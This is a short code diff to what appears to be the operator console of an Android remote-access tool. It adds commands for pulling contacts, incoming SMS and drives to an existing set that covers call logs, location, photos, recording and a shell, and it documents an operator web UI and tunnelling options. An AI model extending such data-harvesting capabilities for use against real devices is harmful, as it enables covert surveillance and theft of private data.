@@ -12,7 +12,7 @@ ADB_COMMANDS = {
     "serve", "launch", "consent", "update", "axenable", "axdisable", "tap",
     "swipe", "settext", "gaction", "installstatus", "wake", "vol", "clipset",
     "clipget", "torch", "vibrate", "apps", "startapp", "notifs", "notifsenable",
-    "notifsdisable", "ping", "id", "perms", "log", "smslog", "shell", "ls",
+    "notifsdisable", "ping", "id", "perms", "log", "smslog", "shell", "ls", "contacts", "smsin", "drives",
     "get", "put", "screen", "sms", "calllog", "call", "loc", "photos", "rec"
 }
 
@@ -36,6 +36,11 @@ def print_general_help():
         "  [cyan]--no-enc[/cyan]                      Disable AES-256-GCM payload encryption\n"
         "  [cyan]--tunnel {named,quick,off}[/cyan]    Cloudflare tunnel mode (default: quick/named)\n"
         "  [cyan]--setup-tunnel HOST[/cyan]           Configure persistent named Cloudflare tunnel\n\n"
+        "[bold white]Web UI:[/bold white]\n"
+        "  [cyan]--web[/cyan]                         Start the operator web UI alongside the console\n"
+        "  [cyan]--web-port PORT[/cyan]               Web UI port (default: 8888)\n"
+        "  [cyan]--web-host HOST[/cyan]               Web UI bind host (default: 127.0.0.1)\n"
+        "  [cyan]--web-token TOKEN[/cyan]             Require a bearer token for web access\n\n"
         "[bold white]Plugin Subcommands:[/bold white]\n"
         "  [cyan]plugins list[/cyan]                  List installed and built-in plugins\n"
         "  [cyan]plugins info <name>[/cyan]          Show plugin details and commands\n"
